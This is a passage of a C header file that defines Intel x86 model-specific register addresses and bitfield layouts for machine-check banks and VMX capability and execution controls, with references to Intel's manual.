#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC1_MASK 0x07
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC1(_) (((_) >> 1) & 0x07)
    UINT64 Reserved1 : 28;

    /**
     * [Bits 35:32] Reserved or model specific.
     */
    UINT64 Reservedormodelspecific2 : 4;
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC2_BIT 32
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC2_FLAG 0xF00000000
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC2_MASK 0x0F
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC2(_) (((_) >> 32) & 0x0F)
    UINT64 Reserved2 : 28;
  };

  UINT64 Flags;
} IA32_PEBS_ENABLE_REGISTER;

/**
 * @defgroup IA32_MC_CTL \
 *           IA32_MC(i)_CTL
 *
 * IA32_MC(0-28)_CTL.
 *
 * @remarks If IA32_MCG_CAP.CNT > n
 * @{
 */
#define IA32_MC0_CTL 0x00000400
#define IA32_MC1_CTL 0x00000404
#define IA32_MC2_CTL 0x00000408
#define IA32_MC3_CTL 0x0000040C
#define IA32_MC4_CTL 0x00000410
#define IA32_MC5_CTL 0x00000414
#define IA32_MC6_CTL 0x00000418
#define IA32_MC7_CTL 0x0000041C
#define IA32_MC8_CTL 0x00000420
#define IA32_MC9_CTL 0x00000424
#define IA32_MC10_CTL 0x00000428
#define IA32_MC11_CTL 0x0000042C
#define IA32_MC12_CTL 0x00000430
#define IA32_MC13_CTL 0x00000434
#define IA32_MC14_CTL 0x00000438
#define IA32_MC15_CTL 0x0000043C
#define IA32_MC16_CTL 0x00000440
#define IA32_MC17_CTL 0x00000444
#define IA32_MC18_CTL 0x00000448
#define IA32_MC19_CTL 0x0000044C
#define IA32_MC20_CTL 0x00000450
#define IA32_MC21_CTL 0x00000454
#define IA32_MC22_CTL 0x00000458
#define IA32_MC23_CTL 0x0000045C
#define IA32_MC24_CTL 0x00000460
#define IA32_MC25_CTL 0x00000464
#define IA32_MC26_CTL 0x00000468
#define IA32_MC27_CTL 0x0000046C
#define IA32_MC28_CTL 0x00000470
/**
 * @}
 */

/**
 * @defgroup IA32_MC_STATUS \
 *           IA32_MC(i)_STATUS
 *
 * IA32_MC(0-28)_STATUS.
 *
 * @remarks If IA32_MCG_CAP.CNT > n
 * @{
 */
#define IA32_MC0_STATUS 0x00000401
#define IA32_MC1_STATUS 0x00000405
#define IA32_MC2_STATUS 0x00000409
#define IA32_MC3_STATUS 0x0000040D
#define IA32_MC4_STATUS 0x00000411
#define IA32_MC5_STATUS 0x00000415
#define IA32_MC6_STATUS 0x00000419
#define IA32_MC7_STATUS 0x0000041D
#define IA32_MC8_STATUS 0x00000421
#define IA32_MC9_STATUS 0x00000425
#define IA32_MC10_STATUS 0x00000429
#define IA32_MC11_STATUS 0x0000042D
#define IA32_MC12_STATUS 0x00000431
#define IA32_MC13_STATUS 0x00000435
#define IA32_MC14_STATUS 0x00000439
#define IA32_MC15_STATUS 0x0000043D
#define IA32_MC16_STATUS 0x00000441
#define IA32_MC17_STATUS 0x00000445
#define IA32_MC18_STATUS 0x00000449
#define IA32_MC19_STATUS 0x0000044D
#define IA32_MC20_STATUS 0x00000451
#define IA32_MC21_STATUS 0x00000455
#define IA32_MC22_STATUS 0x00000459
#define IA32_MC23_STATUS 0x0000045D
#define IA32_MC24_STATUS 0x00000461
#define IA32_MC25_STATUS 0x00000465
#define IA32_MC26_STATUS 0x00000469
#define IA32_MC27_STATUS 0x0000046D
#define IA32_MC28_STATUS 0x00000471
/**
 * @}
 */

/**
 * @defgroup IA32_MC_ADDR \
 *           IA32_MC(i)_ADDR
 *
 * IA32_MC(0-28)_ADDR.
 *
 * @remarks If IA32_MCG_CAP.CNT > n
 * @{
 */
#define IA32_MC0_ADDR 0x00000402
#define IA32_MC1_ADDR 0x00000406
#define IA32_MC2_ADDR 0x0000040A
#define IA32_MC3_ADDR 0x0000040E
#define IA32_MC4_ADDR 0x00000412
#define IA32_MC5_ADDR 0x00000416
#define IA32_MC6_ADDR 0x0000041A
#define IA32_MC7_ADDR 0x0000041E
#define IA32_MC8_ADDR 0x00000422
#define IA32_MC9_ADDR 0x00000426
#define IA32_MC10_ADDR 0x0000042A
#define IA32_MC11_ADDR 0x0000042E
#define IA32_MC12_ADDR 0x00000432
#define IA32_MC13_ADDR 0x00000436
#define IA32_MC14_ADDR 0x0000043A
#define IA32_MC15_ADDR 0x0000043E
#define IA32_MC16_ADDR 0x00000442
#define IA32_MC17_ADDR 0x00000446
#define IA32_MC18_ADDR 0x0000044A
#define IA32_MC19_ADDR 0x0000044E
#define IA32_MC20_ADDR 0x00000452
#define IA32_MC21_ADDR 0x00000456
#define IA32_MC22_ADDR 0x0000045A
#define IA32_MC23_ADDR 0x0000045E
#define IA32_MC24_ADDR 0x00000462
#define IA32_MC25_ADDR 0x00000466
#define IA32_MC26_ADDR 0x0000046A
#define IA32_MC27_ADDR 0x0000046E
#define IA32_MC28_ADDR 0x00000472
/**
 * @}
 */

/**
 * @defgroup IA32_MC_MISC \
 *           IA32_MC(i)_MISC
 *
 * IA32_MC(0-28)_MISC.
 *
 * @remarks If IA32_MCG_CAP.CNT > n
 * @{
 */
#define IA32_MC0_MISC 0x00000403
#define IA32_MC1_MISC 0x00000407
#define IA32_MC2_MISC 0x0000040B
#define IA32_MC3_MISC 0x0000040F
#define IA32_MC4_MISC 0x00000413
#define IA32_MC5_MISC 0x00000417
#define IA32_MC6_MISC 0x0000041B
#define IA32_MC7_MISC 0x0000041F
#define IA32_MC8_MISC 0x00000423
#define IA32_MC9_MISC 0x00000427
#define IA32_MC10_MISC 0x0000042B
#define IA32_MC11_MISC 0x0000042F
#define IA32_MC12_MISC 0x00000433
#define IA32_MC13_MISC 0x00000437
#define IA32_MC14_MISC 0x0000043B
#define IA32_MC15_MISC 0x0000043F
#define IA32_MC16_MISC 0x00000443
#define IA32_MC17_MISC 0x00000447
#define IA32_MC18_MISC 0x0000044B
#define IA32_MC19_MISC 0x0000044F
#define IA32_MC20_MISC 0x00000453
#define IA32_MC21_MISC 0x00000457
#define IA32_MC22_MISC 0x0000045B
#define IA32_MC23_MISC 0x0000045F
#define IA32_MC24_MISC 0x00000463
#define IA32_MC25_MISC 0x00000467
#define IA32_MC26_MISC 0x0000046B
#define IA32_MC27_MISC 0x0000046F
#define IA32_MC28_MISC 0x00000473
/**
 * @}
 */

/**
 * Reporting Register of Basic VMX Capabilities.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.1(BASIC VMX INFORMATION)]
 * @see Vol3D[A.1(Basic VMX Information)] (reference)
 */
#define IA32_VMX_BASIC 0x00000480
typedef union {
  struct {
    /**
     * @brief VMCS revision identifier used by the processor
     *
     * [Bits 30:0] 31-bit VMCS revision identifier used by the processor. Processors that use the
     * same VMCS revision identifier use the same size for VMCS regions.
     */
    UINT64 VmcsRevisionId : 31;
#define IA32_VMX_BASIC_VMCS_REVISION_ID_BIT 0
#define IA32_VMX_BASIC_VMCS_REVISION_ID_FLAG 0x7FFFFFFF
#define IA32_VMX_BASIC_VMCS_REVISION_ID_MASK 0x7FFFFFFF
#define IA32_VMX_BASIC_VMCS_REVISION_ID(_) (((_) >> 0) & 0x7FFFFFFF)

    /**
     * [Bit 31] Bit 31 is always 0.
     */
    UINT64 MustBeZero : 1;
#define IA32_VMX_BASIC_MUST_BE_ZERO_BIT 31
#define IA32_VMX_BASIC_MUST_BE_ZERO_FLAG 0x80000000
#define IA32_VMX_BASIC_MUST_BE_ZERO_MASK 0x01
#define IA32_VMX_BASIC_MUST_BE_ZERO(_) (((_) >> 31) & 0x01)

    /**
     * @brief Size of the VMCS
     *
     * [Bits 44:32] Report the number of bytes that software should allocate for the VMXON region
     * and any VMCS region. It is a value greater than 0 and at most 4096 (bit 44 is set if and only
     * if bits 43:32 are clear).
     */
    UINT64 VmcsSizeInBytes : 13;
#define IA32_VMX_BASIC_VMCS_SIZE_IN_BYTES_BIT 32
#define IA32_VMX_BASIC_VMCS_SIZE_IN_BYTES_FLAG 0x1FFF00000000
#define IA32_VMX_BASIC_VMCS_SIZE_IN_BYTES_MASK 0x1FFF
#define IA32_VMX_BASIC_VMCS_SIZE_IN_BYTES(_) (((_) >> 32) & 0x1FFF)
    UINT64 Reserved1 : 3;

    /**
     * @brief Width of physical address used for the VMCS
     *        - 0 -> limited to the available amount of physical RAM
     *        - 1 -> within the first 4 GB
     *
     * [Bit 48] Indicates the width of the physical addresses that may be used for the VMXON region,
     * each VMCS, and data structures referenced by pointers in a VMCS (I/O bitmaps, virtual-APIC
     * page, MSR areas for VMX transitions). If the bit is 0, these addresses are limited to the
     * processor's physical-address width.2 If the bit is 1, these addresses are limited to 32 bits.
     * This bit is always 0 for processors that support Intel 64 architecture.
     */
    UINT64 VmcsPhysicalAddressWidth : 1;
#define IA32_VMX_BASIC_VMCS_PHYSICAL_ADDRESS_WIDTH_BIT 48
#define IA32_VMX_BASIC_VMCS_PHYSICAL_ADDRESS_WIDTH_FLAG 0x1000000000000
#define IA32_VMX_BASIC_VMCS_PHYSICAL_ADDRESS_WIDTH_MASK 0x01
#define IA32_VMX_BASIC_VMCS_PHYSICAL_ADDRESS_WIDTH(_) (((_) >> 48) & 0x01)

    /**
     * @brief Whether the processor supports the dual-monitor treatment of system-management
     * interrupts and system-management code (always 1)
     *
     * [Bit 49] Read as 1, the logical processor supports the dual-monitor treatment of
     * system-management interrupts and system-management mode.
     *
     * @see Vol3C[34.15(DUAL-MONITOR TREATMENT OF SMIs AND SMM)]
     */
    UINT64 DualMonitorSupport : 1;
#define IA32_VMX_BASIC_DUAL_MONITOR_SUPPORT_BIT 49
#define IA32_VMX_BASIC_DUAL_MONITOR_SUPPORT_FLAG 0x2000000000000
#define IA32_VMX_BASIC_DUAL_MONITOR_SUPPORT_MASK 0x01
#define IA32_VMX_BASIC_DUAL_MONITOR_SUPPORT(_) (((_) >> 49) & 0x01)

    /**
     * @brief Memory type that must be used for the VMCS
     *
     * [Bits 53:50] Report the memory type that should be used for the VMCS, for data structures
     * referenced by pointers in the VMCS (I/O bitmaps, virtual-APIC page, MSR areas for VMX
     * transitions), and for the MSEG header. If software needs to access these data structures
     * (e.g., to modify the contents of the MSR bitmaps), it can configure the paging structures to
     * map them into the linear-address space. If it does so, it should establish mappings that use
     * the memory type reported bits 53:50 in this MSR. As of this writing, all processors that
     * support VMX operation indicate the write-back type.
     */
    UINT64 MemoryType : 4;
#define IA32_VMX_BASIC_MEMORY_TYPE_BIT 50
#define IA32_VMX_BASIC_MEMORY_TYPE_FLAG 0x3C000000000000
#define IA32_VMX_BASIC_MEMORY_TYPE_MASK 0x0F
#define IA32_VMX_BASIC_MEMORY_TYPE(_) (((_) >> 50) & 0x0F)

    /**
     * @brief Whether the processor provides additional information for exits due to INS/OUTS
     *
     * [Bit 54] When set to 1, the processor reports information in the VM-exit
     * instruction-information field on VM exits due to execution of the INS and OUTS instructions.
     * This reporting is done only if this bit is read as 1.
     *
     * @see Vol3C[27.2.4(Information for VM Exits Due to Instruction Execution)]
     */
    UINT64 InsOutsReporting : 1;
#define IA32_VMX_BASIC_INS_OUTS_REPORTING_BIT 54
#define IA32_VMX_BASIC_INS_OUTS_REPORTING_FLAG 0x40000000000000
#define IA32_VMX_BASIC_INS_OUTS_REPORTING_MASK 0x01
#define IA32_VMX_BASIC_INS_OUTS_REPORTING(_) (((_) >> 54) & 0x01)

    /**
     * @brief Whether default 1 bits in control MSRs (pin/proc/exit/entry) may be cleared to 0 and
     * that 'true' control MSRs are supported
     *
     * [Bit 55] Is read as 1 if any VMX controls that default to 1 may be cleared to 0. It also
     * reports support for the VMX capability MSRs IA32_VMX_TRUE_PINBASED_CTLS,
     * IA32_VMX_TRUE_PROCBASED_CTLS, IA32_VMX_TRUE_EXIT_CTLS, and IA32_VMX_TRUE_ENTRY_CTLS.
     *
     * @see Vol3D[A.2(RESERVED CONTROLS AND DEFAULT SETTINGS)]
     * @see Vol3D[A.3.1(Pin-Based VM-Execution Controls)]
     * @see Vol3D[A.3.2(Primary Processor-Based VM-Execution Controls)]
     * @see Vol3D[A.4(VM-EXIT CONTROLS)]
     * @see Vol3D[A.5(VM-ENTRY CONTROLS)]
     */
    UINT64 VmxControls : 1;
#define IA32_VMX_BASIC_VMX_CONTROLS_BIT 55
#define IA32_VMX_BASIC_VMX_CONTROLS_FLAG 0x80000000000000
#define IA32_VMX_BASIC_VMX_CONTROLS_MASK 0x01
#define IA32_VMX_BASIC_VMX_CONTROLS(_) (((_) >> 55) & 0x01)
    UINT64 Reserved2 : 8;
  };

  UINT64 Flags;
} IA32_VMX_BASIC_REGISTER;

/**
 * Capability Reporting Register of Pin-Based VM-Execution Controls.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.3.1(Pin-Based VM-Execution Controls)]
 * @see Vol3C[24.6.1(Pin-Based VM-Execution Controls)] (reference)
 */
#define IA32_VMX_PINBASED_CTLS 0x00000481
typedef union {
  struct {
    /**
     * @brief External interrupts cause VM-exits if set; otherwise dispatched through the guest's
     * IDT
     *
     * [Bit 0] If this control is 1, external interrupts cause VM exits. Otherwise, they are
     * delivered normally through the guest interrupt-descriptor table (IDT). If this control is 1,
     * the value of RFLAGS.IF does not affect interrupt blocking.
     */
    UINT64 ExternalInterruptExiting : 1;
#define IA32_VMX_PINBASED_CTLS_EXTERNAL_INTERRUPT_EXITING_BIT 0
#define IA32_VMX_PINBASED_CTLS_EXTERNAL_INTERRUPT_EXITING_FLAG 0x01
#define IA32_VMX_PINBASED_CTLS_EXTERNAL_INTERRUPT_EXITING_MASK 0x01
#define IA32_VMX_PINBASED_CTLS_EXTERNAL_INTERRUPT_EXITING(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 2;

    /**
     * @brief Non-maskable interrupts cause VM-exits if set; otherwise dispatched through the
     * guest's IDT
     *
     * [Bit 3] If this control is 1, non-maskable interrupts (NMIs) cause VM exits. Otherwise, they
     * are delivered normally using descriptor 2 of the IDT. This control also determines
     * interactions between IRET and blocking by NMI.
     *
     * @see Vol3C[25.3(CHANGES TO INSTRUCTION BEHAVIOR IN VMX NON-ROOT OPERATION)]
     */
    UINT64 NmiExiting : 1;
#define IA32_VMX_PINBASED_CTLS_NMI_EXITING_BIT 3
#define IA32_VMX_PINBASED_CTLS_NMI_EXITING_FLAG 0x08
#define IA32_VMX_PINBASED_CTLS_NMI_EXITING_MASK 0x01
#define IA32_VMX_PINBASED_CTLS_NMI_EXITING(_) (((_) >> 3) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * @brief Virtual NMIs
     *
     * [Bit 5] If this control is 1, NMIs are never blocked and the "blocking by NMI" bit (bit 3) in
     * the interruptibility-state field indicates "virtual-NMI blocking". This control also
     * interacts with the "NMI-window exiting" VM-execution control.
     *
     * @see Vol3C[24.6.2(Processor-Based VM-Execution Controls)]
     */
    UINT64 VirtualNmi : 1;
#define IA32_VMX_PINBASED_CTLS_VIRTUAL_NMI_BIT 5
#define IA32_VMX_PINBASED_CTLS_VIRTUAL_NMI_FLAG 0x20
#define IA32_VMX_PINBASED_CTLS_VIRTUAL_NMI_MASK 0x01
#define IA32_VMX_PINBASED_CTLS_VIRTUAL_NMI(_) (((_) >> 5) & 0x01)

    /**
     * @brief Activate VMX preemption timer
     *
     * [Bit 6] If this control is 1, the VMX-preemption timer counts down in VMX non-root operation.
     * A VM exit occurs when the timer counts down to zero.
     *
     * @see Vol3C[25.5.1(VMX-Preemption Timer)]
     * @see Vol3C[25.2(OTHER CAUSES OF VM EXITS)]
     */
    UINT64 ActivateVmxPreemptionTimer : 1;
#define IA32_VMX_PINBASED_CTLS_ACTIVATE_VMX_PREEMPTION_TIMER_BIT 6
#define IA32_VMX_PINBASED_CTLS_ACTIVATE_VMX_PREEMPTION_TIMER_FLAG 0x40
#define IA32_VMX_PINBASED_CTLS_ACTIVATE_VMX_PREEMPTION_TIMER_MASK 0x01
#define IA32_VMX_PINBASED_CTLS_ACTIVATE_VMX_PREEMPTION_TIMER(_) (((_) >> 6) & 0x01)

    /**
     * @brief Process interrupts with the posted-interrupt notification vector
     *
     * [Bit 7] If this control is 1, the processor treats interrupts with the posted-interrupt
     * notification vector specially, updating the virtual-APIC page with posted-interrupt requests.
     *
     * @see Vol3C[24.6.8(Controls for APIC Virtualization)]
     * @see Vol3C[29.6(POSTED-INTERRUPT PROCESSING)]
     */
    UINT64 ProcessPostedInterrupts : 1;
#define IA32_VMX_PINBASED_CTLS_PROCESS_POSTED_INTERRUPTS_BIT 7
#define IA32_VMX_PINBASED_CTLS_PROCESS_POSTED_INTERRUPTS_FLAG 0x80
#define IA32_VMX_PINBASED_CTLS_PROCESS_POSTED_INTERRUPTS_MASK 0x01
#define IA32_VMX_PINBASED_CTLS_PROCESS_POSTED_INTERRUPTS(_) (((_) >> 7) & 0x01)
    UINT64 Reserved3 : 56;
  };

  UINT64 Flags;
} IA32_VMX_PINBASED_CTLS_REGISTER;

/**
 * Capability Reporting Register of Primary Processor-Based VM-Execution Controls.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.3.2(Primary Processor-Based VM-Execution Controls)]
 * @see Vol3C[24.6.2(Processor-Based VM-Execution Controls)] (reference)
 */
#define IA32_VMX_PROCBASED_CTLS 0x00000482
typedef union {
  struct {
    UINT64 Reserved1 : 2;

    /**
     * @brief VM-exit as soon as RFLAGS.IF=1 and no blocking is active
     *
     * [Bit 2] If this control is 1, a VM exit occurs at the beginning of any instruction if
     * RFLAGS.IF = 1 and there are no other blocking of interrupts.
     *
     * @see Vol3C[24.4.2(Guest Non-Register State)]
     */
    UINT64 InterruptWindowExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_INTERRUPT_WINDOW_EXITING_BIT 2
#define IA32_VMX_PROCBASED_CTLS_INTERRUPT_WINDOW_EXITING_FLAG 0x04
#define IA32_VMX_PROCBASED_CTLS_INTERRUPT_WINDOW_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_INTERRUPT_WINDOW_EXITING(_) (((_) >> 2) & 0x01)

    /**
     * @brief Use timestamp counter offset
     *
     * [Bit 3] This control determines whether executions of RDTSC, executions of RDTSCP, and
     * executions of RDMSR that read from the IA32_TIME_STAMP_COUNTER MSR return a value modified by
     * the TSC offset field.
     *
     * @see Vol3C[24.6.5(Time-Stamp Counter Offset and Multiplier)]
     * @see Vol3C[25.3(CHANGES TO INSTRUCTION BEHAVIOR IN VMX NON-ROOT OPERATION)]
     */
    UINT64 UseTscOffsetting : 1;
#define IA32_VMX_PROCBASED_CTLS_USE_TSC_OFFSETTING_BIT 3
#define IA32_VMX_PROCBASED_CTLS_USE_TSC_OFFSETTING_FLAG 0x08
#define IA32_VMX_PROCBASED_CTLS_USE_TSC_OFFSETTING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_USE_TSC_OFFSETTING(_) (((_) >> 3) & 0x01)
    UINT64 Reserved2 : 3;

    /**
     * @brief VM-exit when executing the HLT instruction
     *
     * [Bit 7] This control determines whether executions of HLT cause VM exits.
     */
    UINT64 HltExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_HLT_EXITING_BIT 7
#define IA32_VMX_PROCBASED_CTLS_HLT_EXITING_FLAG 0x80
#define IA32_VMX_PROCBASED_CTLS_HLT_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_HLT_EXITING(_) (((_) >> 7) & 0x01)
    UINT64 Reserved3 : 1;

    /**
     * @brief VM-exit when executing the INVLPG instruction
     *
     * [Bit 9] This control determines whether executions of INVLPG cause VM exits.
     */
    UINT64 InvlpgExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_INVLPG_EXITING_BIT 9
#define IA32_VMX_PROCBASED_CTLS_INVLPG_EXITING_FLAG 0x200
#define IA32_VMX_PROCBASED_CTLS_INVLPG_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_INVLPG_EXITING(_) (((_) >> 9) & 0x01)

    /**
     * @brief VM-exit when executing the MWAIT instruction
     *
     * [Bit 10] This control determines whether executions of MWAIT cause VM exits.
     */
    UINT64 MwaitExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_MWAIT_EXITING_BIT 10
#define IA32_VMX_PROCBASED_CTLS_MWAIT_EXITING_FLAG 0x400
#define IA32_VMX_PROCBASED_CTLS_MWAIT_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_MWAIT_EXITING(_) (((_) >> 10) & 0x01)

    /**
     * @brief VM-exit when executing the RDPMC instruction
     *
     * [Bit 11] This control determines whether executions of RDPMC cause VM exits.
     */
    UINT64 RdpmcExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_RDPMC_EXITING_BIT 11
#define IA32_VMX_PROCBASED_CTLS_RDPMC_EXITING_FLAG 0x800
#define IA32_VMX_PROCBASED_CTLS_RDPMC_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_RDPMC_EXITING(_) (((_) >> 11) & 0x01)

    /**
     * @brief VM-exit when executing the RDTSC/RDTSCP instruction
     *
     * [Bit 12] This control determines whether executions of RDTSC and RDTSCP cause VM exits.
     */
    UINT64 RdtscExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_RDTSC_EXITING_BIT 12
#define IA32_VMX_PROCBASED_CTLS_RDTSC_EXITING_FLAG 0x1000
#define IA32_VMX_PROCBASED_CTLS_RDTSC_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_RDTSC_EXITING(_) (((_) >> 12) & 0x01)
    UINT64 Reserved4 : 2;

    /**
     * @brief VM-exit when executing the MOV to CR3 instruction (forced to 1 on the 'first' VT-x
     * capable CPUs; this actually includes the newest Nehalem CPUs)
     *
     * [Bit 15] In conjunction with the CR3-target controls, this control determines whether
     * executions of MOV to CR3 cause VM exits. The first processors to support the virtual-machine
     * extensions supported only the 1-setting of this control.
     *
     * @see Vol3C[24.6.7(CR3-Target Controls)]
     * @see Vol3C[25.1.3(Instructions That Cause VM Exits Conditionally)]
     */
    UINT64 Cr3LoadExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_CR3_LOAD_EXITING_BIT 15
#define IA32_VMX_PROCBASED_CTLS_CR3_LOAD_EXITING_FLAG 0x8000
#define IA32_VMX_PROCBASED_CTLS_CR3_LOAD_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_CR3_LOAD_EXITING(_) (((_) >> 15) & 0x01)

    /**
     * @brief VM-exit when executing the MOV from CR3 instruction (forced to 1 on the 'first' VT-x
     * capable CPUs; this actually includes the newest Nehalem CPUs)
     *
     * [Bit 16] This control determines whether executions of MOV from CR3 cause VM exits. The first
     * processors to support the virtual-machine extensions supported only the 1-setting of this
     * control.
     */
    UINT64 Cr3StoreExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_CR3_STORE_EXITING_BIT 16
#define IA32_VMX_PROCBASED_CTLS_CR3_STORE_EXITING_FLAG 0x10000
#define IA32_VMX_PROCBASED_CTLS_CR3_STORE_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_CR3_STORE_EXITING(_) (((_) >> 16) & 0x01)
    UINT64 Reserved5 : 2;

    /**
     * @brief VM-exit on CR8 loads
     *
     * [Bit 19] This control determines whether executions of MOV to CR8 cause VM exits.
     */
    UINT64 Cr8LoadExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_CR8_LOAD_EXITING_BIT 19
#define IA32_VMX_PROCBASED_CTLS_CR8_LOAD_EXITING_FLAG 0x80000
#define IA32_VMX_PROCBASED_CTLS_CR8_LOAD_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_CR8_LOAD_EXITING(_) (((_) >> 19) & 0x01)

    /**
     * @brief VM-exit on CR8 stores
     *
     * [Bit 20] This control determines whether executions of MOV from CR8 cause VM exits.
     */
    UINT64 Cr8StoreExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_CR8_STORE_EXITING_BIT 20
#define IA32_VMX_PROCBASED_CTLS_CR8_STORE_EXITING_FLAG 0x100000
#define IA32_VMX_PROCBASED_CTLS_CR8_STORE_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_CR8_STORE_EXITING(_) (((_) >> 20) & 0x01)

    /**
     * @brief Use TPR shadow
     *
     * [Bit 21] Setting this control to 1 enables TPR virtualization and other APIC-virtualization
     * features.
     *
     * @see Vol3C[29(APIC VIRTUALIZATION AND VIRTUAL INTERRUPTS)]
     */
    UINT64 UseTprShadow : 1;
#define IA32_VMX_PROCBASED_CTLS_USE_TPR_SHADOW_BIT 21
#define IA32_VMX_PROCBASED_CTLS_USE_TPR_SHADOW_FLAG 0x200000
#define IA32_VMX_PROCBASED_CTLS_USE_TPR_SHADOW_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_USE_TPR_SHADOW(_) (((_) >> 21) & 0x01)

    /**
     * @brief VM-exit when virtual NMI blocking is disabled
     *
     * [Bit 22] If this control is 1, a VM exit occurs at the beginning of any instruction if there
     * is no virtual-NMI blocking.
     *
     * @see Vol3C[24.4.2(Guest Non-Register State)]
     */
    UINT64 NmiWindowExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_NMI_WINDOW_EXITING_BIT 22
#define IA32_VMX_PROCBASED_CTLS_NMI_WINDOW_EXITING_FLAG 0x400000
#define IA32_VMX_PROCBASED_CTLS_NMI_WINDOW_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_NMI_WINDOW_EXITING(_) (((_) >> 22) & 0x01)

    /**
     * @brief VM-exit when executing a MOV DRx instruction
     *
     * [Bit 23] This control determines whether executions of MOV DR cause VM exits.
     */
    UINT64 MovDrExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_MOV_DR_EXITING_BIT 23
#define IA32_VMX_PROCBASED_CTLS_MOV_DR_EXITING_FLAG 0x800000
#define IA32_VMX_PROCBASED_CTLS_MOV_DR_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_MOV_DR_EXITING(_) (((_) >> 23) & 0x01)

    /**
     * @brief VM-exit when executing IO instructions
     *
     * [Bit 24] This control determines whether executions of I/O instructions (IN,
     * INS/INSB/INSW/INSD, OUT, and OUTS/OUTSB/OUTSW/OUTSD) cause VM exits.
     */
    UINT64 UnconditionalIoExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_UNCONDITIONAL_IO_EXITING_BIT 24
#define IA32_VMX_PROCBASED_CTLS_UNCONDITIONAL_IO_EXITING_FLAG 0x1000000
#define IA32_VMX_PROCBASED_CTLS_UNCONDITIONAL_IO_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_UNCONDITIONAL_IO_EXITING(_) (((_) >> 24) & 0x01)

    /**
     * @brief Use IO bitmaps
     *
     * [Bit 25] This control determines whether I/O bitmaps are used to restrict executions of I/O
     * instructions For this control, "0" means "do not use I/O bitmaps" and "1" means "use I/O
     * bitmaps." If the I/O bitmaps are used, the setting of the "unconditional I/O exiting" control
     * is ignored.
     *
     * @see Vol3C[24.6.4(I/O-Bitmap Addresses)]
     * @see Vol3C[25.1.3(Instructions That Cause VM Exits Conditionally)]
     */
    UINT64 UseIoBitmaps : 1;
#define IA32_VMX_PROCBASED_CTLS_USE_IO_BITMAPS_BIT 25
#define IA32_VMX_PROCBASED_CTLS_USE_IO_BITMAPS_FLAG 0x2000000
#define IA32_VMX_PROCBASED_CTLS_USE_IO_BITMAPS_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_USE_IO_BITMAPS(_) (((_) >> 25) & 0x01)
    UINT64 Reserved6 : 1;

    /**
     * @brief Monitor trap flag
     *
     * [Bit 27] If this control is 1, the monitor trap flag debugging feature is enabled.
     *
     * @see Vol3C[25.5.2(Monitor Trap Flag)]
     */
    UINT64 MonitorTrapFlag : 1;
#define IA32_VMX_PROCBASED_CTLS_MONITOR_TRAP_FLAG_BIT 27
#define IA32_VMX_PROCBASED_CTLS_MONITOR_TRAP_FLAG_FLAG 0x8000000
#define IA32_VMX_PROCBASED_CTLS_MONITOR_TRAP_FLAG_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_MONITOR_TRAP_FLAG(_) (((_) >> 27) & 0x01)

    /**
     * @brief Use MSR bitmaps
     *
     * [Bit 28] This control determines whether MSR bitmaps are used to control execution of the
     * RDMSR and WRMSR instructions. For this control, "0" means "do not use MSR bitmaps" and "1"
     * means "use MSR bitmaps." If the MSR bitmaps are not used, all executions of the RDMSR and
     * WRMSR instructions cause VM exits.
     *
     * @see Vol3C[24.6.9(MSR-Bitmap Address)]
     * @see Vol3C[25.1.3(Instructions That Cause VM Exits Conditionally)]
     */
    UINT64 UseMsrBitmaps : 1;
#define IA32_VMX_PROCBASED_CTLS_USE_MSR_BITMAPS_BIT 28
#define IA32_VMX_PROCBASED_CTLS_USE_MSR_BITMAPS_FLAG 0x10000000
#define IA32_VMX_PROCBASED_CTLS_USE_MSR_BITMAPS_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_USE_MSR_BITMAPS(_) (((_) >> 28) & 0x01)

    /**
     * @brief VM-exit when executing the MONITOR instruction
     *
     * [Bit 29] This control determines whether executions of MONITOR cause VM exits.
     */
    UINT64 MonitorExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_MONITOR_EXITING_BIT 29
#define IA32_VMX_PROCBASED_CTLS_MONITOR_EXITING_FLAG 0x20000000
#define IA32_VMX_PROCBASED_CTLS_MONITOR_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_MONITOR_EXITING(_) (((_) >> 29) & 0x01)

    /**
     * @brief VM-exit when executing the PAUSE instruction
